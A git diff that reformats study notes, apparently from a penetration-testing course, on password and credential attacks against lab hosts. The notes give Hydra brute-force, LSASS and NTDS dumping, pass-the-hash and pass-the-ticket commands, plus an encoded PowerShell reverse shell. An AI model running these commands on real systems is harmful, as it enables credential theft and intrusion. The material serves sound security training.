@@ -1,4 +1,5 @@
-Hashcat hash mode list https://hashcat.net/wiki/doku.php?id=example_hashes
+Hashcat hash mode list <https://hashcat.net/wiki/doku.php?id=example_hashes>
+
 ```
 -m: Mode (hash type)
 -a: Attack type
@@ -17,7 +18,9 @@ Hashcat hash mode list https://hashcat.net/wiki/doku.php?id=example_hashes
 -O: Enable optimized kernels (limits password length)
 -o: Output (if you want it to be saved in a txt)
 ```
+
 ## Linux Credential storage
+
 ```
 /etc/shadow
 /etc/passwd
@@ -27,11 +30,13 @@ Hashcat hash mode list https://hashcat.net/wiki/doku.php?id=example_hashes
 ---
 
 ## Windows Authentication Process
+
 The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) can oftentimes be more complicated than with Linux systems and consists of many different modules that perform the entire logon, retrieval, and verification processes. In addition, there are many different and complex authentication procedures on the Windows system, such as Kerberos authentication. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users and logs them into the local computer. In addition, the LSA maintains information about all aspects of local security on a computer. It also provides various services for translating between names and security IDs (`SIDs`).
 
 The security subsystem keeps track of the security policies and accounts that reside on a computer system. In the case of a Domain Controller, these policies and accounts apply to the domain where the Domain Controller is located. These policies and accounts are stored in Active Directory. In addition, the LSA subsystem provides services for checking access to objects, checking user permissions, and generating monitoring messages.
 
 #### Windows Authentication Process Diagram
+
 ![Passwords Attacks Windows Authentication Process Diagram](../_attachments/Passwords%20Attacks%20Windows%20Authentication%20Process%20Diagram.png)
 
 Local interactive logon is performed by the interaction between the logon process ([WinLogon](https://www.microsoftpressstore.com/articles/article.aspx?p=2228450&seqNum=8)), the logon user interface process (`LogonUI`), the `credential providers`, `LSASS`, one or more `authentication packages`, and `SAM` or `Active Directory`. Authentication packages, in this case, are the Dynamic-Link Libraries (`DLLs`) that perform authentication checks. For example, for non-domain joined and interactive logins, the authentication package `Msv1_0.dll` is used.
@@ -39,11 +44,10 @@ Local interactive logon is performed by the interaction between the logon proces
 `Winlogon` is a trusted process responsible for managing security-related user interactions. These include:
 
 - Launching LogonUI to enter passwords at login
-    
+
 - Changing passwords
-    
+
 - Locking and unlocking the workstation
-    
 
 It relies on credential providers installed on the system to obtain a user's account name or password. Credential providers are `COM` objects that are located in DLLs.
 
@@ -63,11 +67,13 @@ Winlogon is the only process that intercepts login requests from the keyboard se
 | `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |
 
 #### SAM Database
+
 The [Security Account Manager](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc756748(v=ws.10)?redirectedfrom=MSDN) (`SAM`) is a database file in Windows operating systems that stores users' passwords. It can be used to authenticate local and remote users. SAM uses cryptographic measures to prevent unauthenticated users from accessing the system. User passwords are stored in a hash format in a registry structure as either an `LM` hash or an `NTLM` hash. This file is located in `%SystemRoot%/system32/config/SAM` and is mounted on HKLM/SAM. SYSTEM level permissions are required to view it.
 
 Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.
 
 #### Credential Manager
+
 ![Credential Manager](../_attachments/Passwords%20Attacks%20Credential%20Manager.png)
 
 Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's `Credential Locker`. Credentials are encrypted and stored at the following location:
@@ -77,6 +83,7 @@ PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
 ```
 
 #### NTDS
+
 It is very common to come across network environments where Windows systems are joined to a Windows domain. This is common because it makes it easier for admins to manage all the systems owned by their respective organizations (centralized management). In these cases, the Windows systems will send all logon requests to Domain Controllers that belong to the same Active Directory forest. Each Domain Controller hosts a file called `NTDS.dit` that is kept synchronized across all Domain Controllers with the exception of [Read-Only Domain Controllers](https://docs.microsoft.com/en-us/windows/win32/ad/rodc-and-active-directory-schema). NTDS.dit is a database file that stores the data in Active Directory, including but not limited to:
 
 - User accounts (username & password hash)
@@ -89,43 +96,58 @@ It is very common to come across network environments where Windows systems are 
 ## Network Services
 
 ### WinRM
+
 [Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the network protocol [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).
 
 However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports `5985` (`HTTP`) and `5986` (`HTTPS`).
+
 #### NetExec
+
 ```shell
 nxc winrm <target-IP> -u user.list -p password.list
 ```
+
 #### Evil-WinRM
+
 ```shell
 evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 
 ### SSH
+
 #### Hydra - SSH
+
 ```shell
 hydra -L user.list -P password.list ssh://<target-IP>
 ```
 
 ### Remote Desktop Protocol (RDP)
+
 #### Hydra - RDP
+
 ```shell
 hydra -L user.list -P password.list rdp://<target-IP>
 ```
+
 #### xFreeRDP
+
 ```shell
 xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```
 
 ### SMB
+
 #### Hydra - SMB
+
 ```shell
 hydra -L user.list -P password.list smb://10.129.42.197
 ```
 
 #### Metasploit
+
 However, we may also get the following error describing that the server has sent an invalid reply.
 This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).
+
 ```shell
 auxiliary/scanner/smb/smb_login
 ```
@@ -141,6 +163,7 @@ auxiliary/scanner/smb/smb_login
 ```shell
 impacket-secretsdump LOCAL -sam SAM -system SYSTEM  
 ```
+
 #### Copying SAM Registry Hives
 
 There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:
@@ -181,9 +204,11 @@ Upon initial logon, LSASS will:
 - Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
 - Enforce security policies
 - Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)
+
 #### Dumping LSASS Process Memory
 
 ##### Task Manager Method
+
 ```shell
 C:\Users\loggedonusersdirectory\AppData\Local\Temp
 ```
@@ -203,13 +228,15 @@ PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C
 With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing.
 
 #### Using Pypykatz to Extract Credentials
-The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file (`/home/peter/Documents/lsass.dmp`) stored on our attack host. 
+
+The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file (`/home/peter/Documents/lsass.dmp`) stored on our attack host.
 
 ```shell
 pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
 ```
 
 ### Attacking Active Directory & NTDS.dit
+
 ![Domain joined auth proces](../_attachments/Passwords%20Attacks%20Domain%20joined%20auth%20proces.png)
 
 We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats.
@@ -240,7 +267,7 @@ net localgroup
 net user bwilliamson
 ```
 
-##### Creating Shadow Copy of C:
+##### Creating Shadow Copy of C
 
 ```shell
 vssadmin CREATE SHADOW /For=C:
@@ -261,6 +288,7 @@ nxc smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
 ### Credential Hunting in Windows
 
 #### Lazagne
+
 We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a [standalone copy](https://github.com/AlessandroZ/LaZagne/releases/) of Lazagne on our attack host so we can quickly transfer it over to the target. `Lazagne.exe` will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using `xfreerdp` all we must do is copy and paste into the RDP session we have established.
 
 ```shell
@@ -335,7 +363,7 @@ Many applications and processes work with credentials needed for authentication 
 cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
 [sudo] password for cry0l1t3: 
 
-[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
+[SYSTEM - GNOME] cry0l1t3:WLpAEXFa0SbqOHY
 
 
 cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
@@ -389,6 +417,7 @@ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 ### Pass the Hash (PtH)
 
 #### Pass the Hash using Mimikatz (Windows)
+
 ```shell
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
@@ -396,6 +425,7 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06
 #### Pass the Hash with PowerShell Invoke-TheHash (Windows)
 
 SMB
+
 ```powershell
 PS c:\htb> cd C:\tools\Invoke-TheHash\
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
@@ -410,6 +440,7 @@ VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
 ```
 
 Reverse shell
+
 ```powershell
 PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
 PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
@@ -432,11 +463,13 @@ There are several other tools in the Impacket toolkit we can use for command exe
 #### Pass the Hash with NetExec (Linux)
 
 Check
+
 ```shell
 nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
 Command execution
+
 ```shell
 nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
 ```
@@ -456,11 +489,13 @@ There are a few caveats to this attack:
 This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
 
 ##### Enable Restricted Admin Mode to Allow PtH
+
 ```shell
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
 ##### Now PtH with xfreerdp
+
 ```shell
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
@@ -474,6 +509,7 @@ UAC (User Account Control) limits local users' ability to perform remote adminis
 These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer. If you want to learn more about LocalAccountTokenFilterPolicy, you can read Will Schroeder's blog post [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167).
 
 ### Pass the Ticket (PtT) from Windows
+
 We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:
 
 - Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
@@ -490,14 +526,17 @@ sekurlsa::tickets /export
 ```
 
 Rubeus
+
 ```shell
  Rubeus.exe dump /nowrap
 ```
 
 #### Pass the Key or OverPass the Hash
+
 The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`. This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also [Will Schroeder](https://twitter.com/harmj0y) adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.
 
 ##### Mimikatz - Extract Kerberos Keys
+
 ```shell
 sekurlsa::ekeys
 ```
@@ -505,18 +544,19 @@ sekurlsa::ekeys
 Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
 
 ##### Mimikatz - Pass the Key or OverPass the Hash
+
 ```shell
 sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
 ```
 
 ##### Rubeus - Pass the Key or OverPass the Hash
+
 ```shell
 Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
 
 > [!NOTE]
 > Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
-
 
 To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool documentation [Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash).
 
@@ -526,23 +566,28 @@ To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `
 #### Pass the Ticket (PtT)
 
 ##### Rubeus Pass the Ticket
+
 With hash
+
 ```shell
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 ```
 
 With .kirbi ticket
+
 ```shell
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 ```
 
 Convert .kirbi to Base64 Format
+
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 ```
 
 Pass the Ticket - Base64 Format
-```shell 
+
+```shell
 Rubeus.exe ptt /ticket:doIE1jCC....
 ```
 
@@ -572,6 +617,7 @@ inlanefreight\john
 ```
 
 ##### Rubeus - PowerShell Remoting with Pass the Ticket
+
 ###### Create a Sacrificial Process with Rubeus
 
 ```shell
@@ -608,6 +654,7 @@ Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/a
 > Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
 #### Identifying Linux and Active Directory Integration
+
 ##### realm - Check If Linux Machine is Domain Joined
 
 ```shell
@@ -697,6 +744,7 @@ Carlos has a cronjob that uses a keytab file named `svc_workstations.kt`. We can
 #### Abusing Keytab ccache
 
 To abuse a ccache file, all we need is read privileges on the file. These files, located in `/tmp`, can only be read by the user who created them, but if we gain root access, we could use them.
+
 ##### Importing the ccache File into our Current Session
 
 ```shell
@@ -723,6 +771,7 @@ cat /etc/hosts
 ```
 
 We need to modify our proxychains configuration file to use socks5 and port 1080.
+
 ##### Proxychains Configuration File
 
 ```shell
@@ -735,6 +784,7 @@ socks5 127.0.0.1 1080
 ```
 
 We must download and execute [chisel](https://github.com/jpillora/chisel) on our attack host.
+
 ##### Download Chisel to our Attack Host
 
 ```shell
@@ -752,11 +802,13 @@ sudo ./chisel server --reverse
 ```
 
 Connect to `MS01` via RDP and execute chisel (located in C:\Tools).
+
 ##### Connect to MS01 with xfreerdp
 
 ```shell
 xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 ```
+
 ##### Execute chisel from MS01
 
 ```shell
@@ -767,6 +819,7 @@ C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 ```
 
 Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
+
 ##### Setting the KRB5CCNAME Environment Variable
 
 ```shell
@@ -774,6 +827,7 @@ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 
 #### Impacket
+
 ##### Using Impacket with proxychains and Kerberos Authentication
 
 ```shell
@@ -783,6 +837,7 @@ proxychains impacket-wmiexec dc01 -k
 #### Evil-Winrm
 
 To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called `krb5-user`. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: `INLANEFREIGHT.HTB`, and the KDC is the `DC01`.
+
 ##### Installing Kerberos Authentication Package
 
 Pass the Ticket (PtT) from Linux
@@ -792,6 +847,7 @@ sudo apt-get install krb5-user -y
 ```
 
 In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
+
 ##### Kerberos Configuration File for INLANEFREIGHT.HTB
 
 ```shell
@@ -811,14 +867,17 @@ cat /etc/krb5.conf
 ```
 
 Now we can use evil-winrm.
+
 ##### Using Evil-WinRM with Kerberos
 
 ```shell
 proxychains evil-winrm -i dc01 -r inlanefreight.htb
 ```
+
 #### Miscellaneous
 
 If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
+
 ##### Impacket Ticket Converter
 
 ```shell
@@ -836,7 +895,9 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 ```
 
 ## Cracking Files
+
 ### Protected Files
+
 #### John Hashing Scripts
 
 ```shell
@@ -867,7 +928,6 @@ pdf2john.py PDF.pdf > pdf.hash
 john --wordlist=rockyou.txt pdf.hash
 ```
 
-
 #### Bitlocker VHD
 
 ```shell
@@ -895,7 +955,9 @@ sudo umount /media/bitlocker
 
 sudo losetup -D /dev/loop100
 ```
+
 ### Protected Archives
+
 #### Cracking ZIP
 
 ```shell
